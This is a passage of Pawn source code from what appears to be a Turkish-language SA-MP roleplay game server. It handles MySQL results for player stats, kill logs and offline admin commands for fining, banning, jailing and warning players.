					mysql_retrieve_row();

					new
					    szPlayerName[MAX_PLAYER_NAME],
						szReturn[128],
						iplayerid;

                    mysql_fetch_field_row(szPlayerName, "Username", g_MySQLConnections[0]);
					mysql_fetch_field_row(szReturn, "ID", g_MySQLConnections[0]);
				    iplayerid = strval(szReturn);
					mysql_free_result(g_MySQLConnections[0]);

					SendClientMessage(extraid, COLOR_GREEN, "________________________________________________");
					format(szReturn, sizeof(szReturn), "<< %s adlý oyuncunun öldürdüðü son 10 kiþi >>", szPlayerName);
					SendClientMessage(extraid, COLOR_YELLOW, szReturn);

					format(szQuery, sizeof(szQuery), "SELECT kills.* FROM kills INNER JOIN players ON kills.killerID = players.ID OR kills.killedID = players.ID WHERE players.ID = '%d' ORDER BY kills.killTS ASC LIMIT 10", iplayerid);
					mysql_query(szQuery, THREAD_OFFLINE_KILLS_2, extraid, g_MySQLConnections[0]);
				}
			}
	    }
	    case THREAD_OFFLINE_KILLS_2: {
			mysql_store_result(g_MySQLConnections[0]);
			new
				KillLog[128],
				iSlot = 0;

			while(mysql_retrieve_row()) {
				iSlot++;
				switch(iSlot) {
					case 9: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 8: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 7: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 6: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 5: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 4: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 3: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 2: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 1: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
					case 0: {
						mysql_fetch_field_row(KillLog, "killText", g_MySQLConnections[0]);
						if(!isnull(KillLog)) SendClientMessage(extraid, COLOR_YELLOW, KillLog);
					}
				}
			}
			mysql_free_result(g_MySQLConnections[0]);
		}
	    case THREAD_GET_STATS: {
	        mysql_store_result(g_MySQLConnections[0]);
			if(IsPlayerConnected(extraid)) {
			    new
			        szReturn[128];

		        if(mysql_num_rows(g_MySQLConnections[0]) == 0) { // No rows exist with the specified criteria, so, wrong password!
		            mysql_free_result(g_MySQLConnections[0]);
					SendClientMessage(extraid, COLOR_GREY, "Girilen karakter geçersiz.");
		        } else {
		            mysql_retrieve_row();

					new facgang[20], employer[64], rank[64], division[64], jtext[20], jtext2[20];

					mysql_fetch_field_row(szReturn, "Level", g_MySQLConnections[0]);
				    new level = strval(szReturn);

				    mysql_fetch_field_row(szReturn, "ConnectTime", g_MySQLConnections[0]);
				    new phours = strval(szReturn);

				    mysql_fetch_field_row(szReturn, "Respect", g_MySQLConnections[0]);
					new respect = strval(szReturn);

					new nxtlevel = level + 1;
					new expamount = nxtlevel*levelexp;
					new costlevel = nxtlevel*2500;

					mysql_fetch_field_row(szReturn, "PhoneNumber", g_MySQLConnections[0]);
					new pnumber = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Warnings", g_MySQLConnections[0]);
					new warns = strval(szReturn);

					facgang = "Faction";
					employer = "Yok";
					rank = "Yok";

					mysql_fetch_field_row(szReturn, "Gang", g_MySQLConnections[0]);
					new iGang = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Rank", g_MySQLConnections[0]);
					new iRank = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Division", g_MySQLConnections[0]);
					new iDivision = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Faction", g_MySQLConnections[0]);
					new iFaction = strval(szReturn);

					if(iGang < 255) {
					    facgang = "Family";
						division = "Yok";

						format(employer, sizeof(employer), "%s", FamilyInfo[iGang][FamilyName]);
						switch(iRank) {
							case 1: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank1]);
							case 2: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank2]);
							case 3: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank3]);
							case 4: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank4]);
							case 5: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank5]);
				  			case 6: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank6]);
							default: format(rank, sizeof(rank), "%s", FamilyInfo[iGang][FamilyRank1]);
						}
					}
					else {
					    PlayerInfo[MAX_PLAYERS][pDivision] = iDivision;
					    PlayerInfo[MAX_PLAYERS][pRank] = iRank;
					    PlayerInfo[MAX_PLAYERS][pFaction] = iFaction;

			            GetPlayerFactionInfo(MAX_PLAYERS, rank, division, employer);
					}

					mysql_fetch_field_row(szReturn, "Job", g_MySQLConnections[0]);
					new iJob = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Job2", g_MySQLConnections[0]);
					new iJob2 = strval(szReturn);

					switch(iJob)
					{
						case 1: jtext = "Dedektif";
						case 2: jtext = "Avukat";
						case 3: jtext = "Hayat Kadýný";
						case 4: jtext = "Uyuþturucu Satýcýsý";
						case 5: jtext = "Araba Hýrsýzý";
						//case 6: jtext = "News Reporter";
						case 7: jtext = "Tamirci";
						case 8: jtext = "Bodyguard";
						case 9: jtext = "Silah Satýcýsý";
						//case 10: jtext = "Car Dealer";
						case 12: jtext = "Boksör";
						case 14: jtext = "UyuþturucuKaçakçýsý";
						//case 15: jtext = "Paper Boy";
						//case 16: jtext = "Kamyon Þoförü";
						//case 17: jtext = "Taksici";
						case 18: jtext = "Zanaatkar";
						case 19: jtext = "Barmen";
						case 20: jtext = "Kamyon Þoförü";
						case 21: jtext = "Pizzacý";
						default: jtext = "Yok";
					}
					switch(iJob2)
					{
						case 1: jtext2 = "Dedektif";
						case 2: jtext2 = "Avukat";
						case 3: jtext2 = "Hayat Kadýný";
						case 4: jtext2 = "Uyuþturucu Satýcýsý";
						case 5: jtext2 = "Araba Hýrsýzý";
						//case 6: jtext2 = "News Reporter";
						case 7: jtext2 = "Tamirci";
						case 8: jtext2 = "Bodyguard";
						case 9: jtext2 = "Silah Satýcýsý";
						//case 10: jtext2 = "Car Dealer";
						case 12: jtext2 = "Boksör";
						case 14: jtext2 = "UyuþturucuKaçakçýsý";
						//case 15: jtext2 = "Paper Boy";
						//case 16: jtext2 = "Kamyon Þoförü";
						//case 17: jtext2 = "Taksici";
						case 18: jtext2 = "Zanaatkar";
						case 19: jtext2 = "Barmen";
						case 20: jtext2 = "Kamyon Þoförü";
						case 21: jtext2 = "Pizzacý";
						default: jtext2 = "Yok";
					}

					new jlevel;
					switch(iJob)
					{
						case 1:
						{
								mysql_fetch_field_row(szReturn, "DetSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 2:
						{
								mysql_fetch_field_row(szReturn, "LawSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 3:
						{
								mysql_fetch_field_row(szReturn, "SexSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 4:
						{
								mysql_fetch_field_row(szReturn, "DrugsSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 5:
						{
								mysql_fetch_field_row(szReturn, "CarSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
				  		case 7:
						{
								mysql_fetch_field_row(szReturn, "MechSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 9:
						{
								mysql_fetch_field_row(szReturn, "ArmsSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel < 50) { jlevel = 1; }
								else if(skilllevel >= 50 && skilllevel < 100) { jlevel = 2; }
								else if(skilllevel >= 100 && skilllevel < 200) { jlevel = 3; }
								else if(skilllevel >= 200 && skilllevel < 400) { jlevel = 4; }
								else if(skilllevel >= 400) { jlevel = 5; }
						}
						case 12:
						{
								mysql_fetch_field_row(szReturn, "BoxSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 14:
						{
								mysql_fetch_field_row(szReturn, "SmugSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						case 20:
						{
								mysql_fetch_field_row(szReturn, "TruckSkill", g_MySQLConnections[0]);
								new skilllevel = strval(szReturn);
								if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
								else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
								else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
								else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
								else if(skilllevel >= 401) { jlevel = 5; }
						}
						default: jlevel = 0;
					}

                    mysql_fetch_field_row(szReturn, "UpgradePoints", g_MySQLConnections[0]);
					new upgrade = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SpawnArmor", g_MySQLConnections[0]);
					new Float:sarmor = floatstr(szReturn);

                    mysql_fetch_field_row(szReturn, "Cash", g_MySQLConnections[0]);
					new cash = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Bank", g_MySQLConnections[0]);
					new bank = strval(szReturn);

					new totalwealth = cash + bank;

					mysql_fetch_field_row(szReturn, "Insurance", g_MySQLConnections[0]);
					new iInsurance = strval(szReturn);

					new insur[20];
					switch(iInsurance)
					{
						case 1: insur = "County General";
						case 2: insur = "All Saints";
						default: insur = "Yok";
					}

                    mysql_fetch_field_row(szReturn, "Crimes", g_MySQLConnections[0]);
					new crimes = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Arrested", g_MySQLConnections[0]);
					new arrests = strval(szReturn);

					mysql_fetch_field_row(szReturn, "WantedLevel", g_MySQLConnections[0]);
					new wanted = strval(szReturn);

					new Float:health, Float:armor;

					mysql_fetch_field_row(szReturn, "Health", g_MySQLConnections[0]);
					health = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "Armor", g_MySQLConnections[0]);
					armor = floatstr(szReturn);

                    mysql_fetch_field_row(szReturn, "Pot", g_MySQLConnections[0]);
					new pot = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Crack", g_MySQLConnections[0]);
					new crack = strval(szReturn);

                    mysql_fetch_field_row(szReturn, "RadioFreq", g_MySQLConnections[0]);
					new radiofreq = strval(szReturn);

                    mysql_fetch_field_row(szReturn, "Materials", g_MySQLConnections[0]);
					new mats = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Rope", g_MySQLConnections[0]);
					new rope = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Cigars", g_MySQLConnections[0]);
					new cigars = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Sprunk", g_MySQLConnections[0]);
					new sprunk = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Spraycan", g_MySQLConnections[0]);
					new spray = strval(szReturn);

					mysql_fetch_field_row(szReturn, "BiggestFish", g_MySQLConnections[0]);
					new bigfish = strval(szReturn);
					
					mysql_fetch_field_row(szReturn, "Biz", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "VBiz", g_MySQLConnections[0]);

					// Eight line (admin only)
					mysql_fetch_field_row(szReturn, "House", g_MySQLConnections[0]);
					new house = strval(szReturn);
					
					mysql_fetch_field_row(szReturn, "Biz", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBiz] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "VBiz", g_MySQLConnections[0]);
					PlayerInfo[extraid][pVBiz] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Renting", g_MySQLConnections[0]);
					new rent = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Interior", g_MySQLConnections[0]);
					new interior = strval(szReturn);

					mysql_fetch_field_row(szReturn, "VirtualWorld", g_MySQLConnections[0]);
					new vw = strval(szReturn);
					new realvw = vw;

					mysql_fetch_field_row(szReturn, "JailTime", g_MySQLConnections[0]);
					new jtime = strval(szReturn);

					new
					    szPlayerName[MAX_PLAYER_NAME];

                    mysql_fetch_field_row(szPlayerName, "Username", g_MySQLConnections[0]);

					// Added
					new married[20];
					mysql_fetch_field_row(married, "MarriedTo", g_MySQLConnections[0]);

                    mysql_fetch_field_row(szReturn, "RefTokens", g_MySQLConnections[0]);
					new reftokens = strval(szReturn);

					new sext[16];
					mysql_fetch_field_row(szReturn, "Sex", g_MySQLConnections[0]);

					if(strval(szReturn) == 1) { sext = "Male"; } else { sext = "Female"; }

					mysql_fetch_field_row(szReturn, "Age", g_MySQLConnections[0]);
					new age = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Donator", g_MySQLConnections[0]);
					new donator = strval(szReturn);

					new donatortxt[16];
					if(donator == 0) { donatortxt = "no"; }
					else if(donator == 1) { donatortxt = "Ruby"; }
					else if(donator == 2) { donatortxt = "Sapphire"; }
					else if(donator == 3) { donatortxt = "Diamond"; }
					else { donatortxt = "no"; }

                    mysql_fetch_field_row(szReturn, "NewMutedTotal", g_MySQLConnections[0]);
					new nmutes = strval(szReturn);

					mysql_fetch_field_row(szReturn, "AdMutedTotal", g_MySQLConnections[0]);
			        new admutes = strval(szReturn);

			        mysql_fetch_field_row(szReturn, "ReportMutedTotal", g_MySQLConnections[0]);
			        new rmutes = strval(szReturn);

                    mysql_fetch_field_row(szReturn, "AdminLevel", g_MySQLConnections[0]);
					new adminlevel = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Banned", g_MySQLConnections[0]);
					new banned = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Permabanned", g_MySQLConnections[0]);
					new permabanned = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Disabled", g_MySQLConnections[0]);
					new disabled = strval(szReturn);

					SendClientMessage(extraid, COLOR_RED,"___________________________________________________________________________________________________");
					SendClientMessage(extraid, COLOR_RED,"¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦");
					SendClientMessage(extraid, COLOR_RED,"___________________________________________________________________________________________________");				    new coordsstring[128];
				    format(coordsstring, sizeof(coordsstring),"%s - (Level: %d) - (Oynama saati: %d) - (Cinsiyet: %s) - (Yaþ: %d) - (Telefon Numarasý: %d) - (Uyarýlar: %d)", szPlayerName, level, phours, sext, age, pnumber, warns);
				    SendClientMessage(extraid, COLOR_WHITE, coordsstring);
					format(coordsstring, sizeof(coordsstring),"(%s: %s) - (Rütbe: %s [%d]) - (Birim: %s) - (Meslek: %s [lvl: %d]) - (Radio frekansý: %d kHz)", facgang, employer, rank, PlayerInfo[MAX_PLAYERS][pRank], division, jtext, jlevel, radiofreq);
					SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Toplam para: $%d) - (Nakit: $%d) - (Banka hesabý: $%d) - (Sigorta: %s) - (Evli: %s)", totalwealth, cash, bank, insur, married);
			   		SendClientMessage(extraid, COLOR_WHITE, coordsstring);
					format(coordsstring, sizeof(coordsstring),"(Saygý puaný: %d/%d [$%d]) - (Geliþim puaný: %d) - (Baþlangýç zýrhý: %.1f) - (Can: %.1f) - (Zýrh: %.1f)", respect, expamount, costlevel, upgrade, sarmor, health, armor);
					SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Suçlar: %d) - (Yakalanmalar: %d) - (Aranma seviyesi: %d) - (Materyal: %d) - (Pot: %d) - (Crack: %d)", crimes, arrests, wanted, mats, pot, crack);
			   		SendClientMessage(extraid, COLOR_WHITE, coordsstring);
			   		format(coordsstring, sizeof(coordsstring),"(Ýp: %d) - (Sigara: %d) - (Gazoz: %d) - (Sprey: %d) -  (Büyük balýk: %d) - (Öneri Jetonu: %d) - (VIP: %s)", rope, cigars, sprunk, spray, bigfish, reftokens, donatortxt);
			        SendClientMessage(extraid, COLOR_FORSTATS, coordsstring);
					format(coordsstring, sizeof(coordsstring), "(Admin Level: %d) - (Banlanma: %d) - (Süresiz ban: %d) - (Hesap kullaným dýþý: %d)", adminlevel, banned, permabanned, disabled);
			  		SendClientMessage(extraid, COLOR_WHITE,coordsstring);
				    format(coordsstring, sizeof(coordsstring), "(Ev: %d) - (Kiralama: %d) - (Int: %d) - (VW: %d) - (Real VW: %d) - (Hapis: %d secs) - (Muteler: [N: %d] [AD: %d] [R: %d])", house, rent, interior, vw, realvw, jtime, nmutes, admutes, rmutes);
				    SendClientMessage(extraid, COLOR_FORSTATS,coordsstring);
					SendClientMessage(extraid, COLOR_RED,"___________________________________________________________________________________________________");
					SendClientMessage(extraid, COLOR_RED,"¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦");
					SendClientMessage(extraid, COLOR_RED,"___________________________________________________________________________________________________");				}
			}

	        mysql_free_result(g_MySQLConnections[0]);
	    }
		case THREAD_OFFLINE_FINE: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            iPlayerAdminLevel,
	            iPlayerBanned,
	            szReason[128],
	            iPlayerPermabanned,
	            iCash,
	            iBankAccount,
	            iFinedAmount,
	            szPlayerName[MAX_PLAYER_NAME],
	            szResult[256],
				iTotalCashAfterFine;

	        if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
				sscanf(szResult, "p<|>dddssdd", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iBankAccount, iCash);

				if(iPlayerPermabanned > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten süresiz banlanmýþ.");

				if(iPlayerAdminLevel > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "Admine ceza kesemezsin.");

				GetPVarString(extraid, "ofinereason", szReason, sizeof(szReason));
				mysql_real_escape_string(szReason, szReason, g_MySQLConnections[0]);

				iFinedAmount = GetPVarInt(extraid, "ofineamount");

				iTotalCashAfterFine = iCash - iFinedAmount;
				format(szQuery, sizeof(szQuery), "UPDATE players SET Cash = %d WHERE Username = '%s'", iTotalCashAfterFine, szPlayerName);
				mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);

				format(szMessage, sizeof(szMessage), "Adminkomutu: %s adlý oyuncuya %s tarafýndan offline olarak $%d ceza kesildi, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), iFinedAmount, szReason);
				Log("logs/admin.log", szMessage);
				format(szMessage, sizeof(szMessage), "Adminkomutu: %s adlý oyuncuya %s tarafýndan offline olarak $%d ceza kesildi, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), iFinedAmount, szReason);
				ABroadCast(COLOR_LIGHTRED,szMessage,1);
	        } else SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok.");

	        mysql_free_result(g_MySQLConnections[0]);
	    }
	    case THREAD_OFFLINE_BAN: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            iPlayerAdminLevel,
	            iPlayerBanned,
	            szReason[128],
	            iPlayerPermabanned,
	            szPlayerName[MAX_PLAYER_NAME],
	            iAccountID,
	            szResult[256];

	        if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
				sscanf(szResult, "p<|>ddds[MAX_PLAYER_NAME]s[20]d", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iAccountID);

				if(iPlayerPermabanned > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten süresiz banlanmýþ.");

				if(iPlayerAdminLevel > 0)
				    return SendClientMessage(extraid, COLOR_GREY, "Adminleri banlayamazsýn.");

				GetPVarString(extraid, "obanreason", szReason, sizeof(szReason));
				mysql_real_escape_string(szReason, szReason, g_MySQLConnections[0]);

				AddBan(szPlayerIP);

				format(szMessage, sizeof(szMessage), "AdminKomutu: %s (Ip: %s) adlý oyuncu, %s tarafýndan offline olarak banlandý, sebep: %s", szPlayerName, szPlayerIP, GetPlayerNameEx(extraid), szReason);
				Log("logs/ban.log", szMessage);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);

				format(szQuery, sizeof(szQuery), "UPDATE players SET Banned = 1 WHERE Username = '%s'", szPlayerName);
				mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);
				punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 4, szMessage, szReason);

				DeletePVar(extraid, "obanreason");
	        } else SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok.");

	        mysql_free_result(g_MySQLConnections[0]);
	    }
	    case THREAD_OFFLINE_PRISON: {
			mysql_store_result(g_MySQLConnections[0]);

			new
				szMessage[128],
				szPlayerIP[20],
				iPlayerAdminLevel,
				iPlayerPrisonTime,
				iPlayerBanned,
				szReason[128],
				iPlayerPermabanned,
				szPlayerName[MAX_PLAYER_NAME],
				iAccountID,
				szResult[285];

			if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
				sscanf(szResult, "p<|>ddds[20]s[19]d", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iPlayerPrisonTime, iAccountID);
				print(szResult);

				if(iPlayerPermabanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten süresiz banlanmýþ.");

				if(iPlayerBanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten banlý.");

				if(iPlayerAdminLevel > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Adminlere uyarý veremezsin.");

				GetPVarString(extraid, "oprisonreason", szReason, sizeof(szReason));
				mysql_real_escape_string(szReason, szReason, g_MySQLConnections[0]);

                iPlayerPrisonTime = GetPVarInt(extraid, "oprisontime");

				format(szMessage, sizeof(szMessage), "AdminKomutu: %s adlý oyuncu, %s tarafýndan offline hapse atýldý, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);
				format(szMessage, sizeof(szMessage), "AdminKomutu: %s adlý oyuncu, %s tarafýndan offline hapse atýldý, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				Log("logs/admin.log", szMessage);
                punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 2, szMessage, szReason);

    			format(szQuery, sizeof(szQuery), "UPDATE players SET Jailed = 3, JailTime = %d, PrisonReason = '%s', PrisonedBy = '%s' WHERE Username = '%s'", iPlayerPrisonTime, szReason, GetPlayerNameExEx(extraid), szPlayerName);
				mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);

				DeletePVar(extraid, "oprisonreason");
				DeletePVar(extraid, "oprisontime");
			} else SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok.");

			mysql_free_result(g_MySQLConnections[0]);
	    }
		case THREAD_OFFLINE_WARN: {
			mysql_store_result(g_MySQLConnections[0]);

			new
				szMessage[128],
				szPlayerIP[20],
				iPlayerAdminLevel,
				iPlayerWarnings,
				iPlayerBanned,
				szReason[128],
				iPlayerPermabanned,
				szPlayerName[MAX_PLAYER_NAME],
				iAccountID,
				szResult[256];

			if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
				sscanf(szResult, "p<|>ddds[24]s[20]dd", iPlayerPermabanned, iPlayerBanned, iPlayerAdminLevel, szPlayerName, szPlayerIP, iPlayerWarnings, iAccountID);
				print(szResult);

				if(iPlayerPermabanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten süresiz banlanmýþ.");

				if(iPlayerBanned > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Girilen oyuncu zaten banlý.");

				if(iPlayerAdminLevel > 0)
					return SendClientMessage(extraid, COLOR_GREY, "Adminlere uyarý veremezsin.");

				GetPVarString(extraid, "owarnreason", szReason, sizeof(szReason));

				iPlayerWarnings += 1;

				if(iPlayerWarnings >= 3) {
					format(szReason, sizeof(szReason), "%s (had 3 warnings)", szReason);
					SetPVarString(extraid, "obanreason", szReason);

	    			format(szQuery, sizeof(szQuery), "UPDATE players SET Warnings = %d WHERE Username = '%s'", iPlayerWarnings, szPlayerName);
					mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);

					punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 4, szMessage, szReason);
					mysql_real_escape_string(szPlayerName, szPlayerName, g_MySQLConnections[0]);

					format(szMessage, sizeof(szMessage), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP FROM players WHERE Username = '%s'", szPlayerName);
					mysql_query(szMessage, THREAD_OFFLINE_BAN, extraid, g_MySQLConnections[0]);
					return 1;
				}

				format(szMessage, sizeof(szMessage), "AdminKomutu: %s adlý oyuncuya %s tarafýndan offline uyarý verildi, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				ABroadCast(COLOR_LIGHTRED, szMessage, 1);
				format(szMessage, sizeof(szMessage), "AdminKomutu: %s adlý oyuncuya %s tarafýndan offline uyarý verildi, sebep: %s", szPlayerName, GetPlayerNameEx(extraid), szReason);
				Log("logs/admin.log", szMessage);
                punishmentLogEx(iAccountID, PlayerInfo[extraid][pID], 1, szMessage, szReason);

    			format(szQuery, sizeof(szQuery), "UPDATE players SET Warnings = %d WHERE Username = '%s'", iPlayerWarnings, szPlayerName);
				mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);

				DeletePVar(extraid, "owarnreason");
			} else SendClientMessage(extraid, COLOR_GREY, "Böyle bir oyuncu yok.");

			mysql_free_result(g_MySQLConnections[0]);
		}
	    case THREAD_OFFLINE_IP_CHECK: {
	        mysql_store_result(g_MySQLConnections[0]);

	        new
	            szMessage[128],
	            szPlayerIP[20],
	            szPlayerName[MAX_PLAYER_NAME],
	            szResult[256];

	        if(mysql_fetch_row_format(szResult, "|", g_MySQLConnections[0])) {
				sscanf(szResult, "p<|>s[20]s[16]", szPlayerName, szPlayerIP);

